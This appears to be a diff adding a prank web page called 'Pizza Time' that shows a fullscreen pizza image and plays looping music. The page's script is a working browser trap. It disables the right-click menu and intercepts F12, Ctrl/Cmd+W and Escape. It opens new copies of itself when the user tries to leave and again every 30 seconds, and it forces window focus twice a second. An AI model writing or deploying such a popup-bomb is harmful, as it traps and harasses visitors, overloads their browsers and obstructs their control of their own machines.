@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Pizza Time</title>
+</head>
+<body style="margin:0;padding:0;overflow:hidden;">
+
+  <div id="popup">
+    <button id="start">Start</button>
+  </div>
+
+  <img id="pizza" src="pizza.jpg" style="display:none; width:100vw; height:100vh; object-fit:cover;">
+  <audio id="music" src="pizzatime.mp3" loop></audio>
+
+  <script>
+    const startBtn = document.getElementById("start");
+    const popup = document.getElementById("popup");
+    const pizza = document.getElementById("pizza");
+    const music = document.getElementById("music");
+
+    window.addEventListener('contextmenu', e => e.preventDefault());
+
+    window.onbeforeunload = function() {
+      spawnPizzaHydra(3);
+      return "NO ESCAPE. IT'S PIZZA TIME.";
+    };
+
+    window.addEventListener("unload", () => {
+      spawnPizzaHydra(5);
+    });
+
+    window.addEventListener("keydown", function(e) {
+      if (
+        e.key === "F12" || 
+        (e.ctrlKey && e.key.toLowerCase() === "w") || 
+        e.key === "Escape" || 
+        (e.metaKey && e.key.toLowerCase() === "w")
+      ) {
+        e.preventDefault();
+        spawnPizzaHydra(2);
+      }
+    });
+
+    setInterval(() => {
+      spawnPizzaHydra(1);
+    }, 30000); // every 30 seconds
+
+    function spawnPizzaHydra(count) {
+      for (let i = 0; i < count; i++) {
+        window.open(window.location.href, "_blank");
+      }
+    }
+
+    startBtn.onclick = function() {
+      popup.style.display = "none";
+      pizza.style.display = "block";
+      music.play();
+
+      // Attempt fullscreen
+      if (pizza.requestFullscreen) {
+        pizza.requestFullscreen();
+      } else if (pizza.webkitRequestFullscreen) {
+        pizza.webkitRequestFullscreen();
+      } else if (pizza.mozRequestFullScreen) {
+        pizza.mozRequestFullScreen();
+      } else if (pizza.msRequestFullscreen) {
+        pizza.msRequestFullscreen();
+      }
+
+
+      setInterval(() => {
+        window.focus();
+      }, 500);
+    };
+  </script>
+
+</body>
+</html>
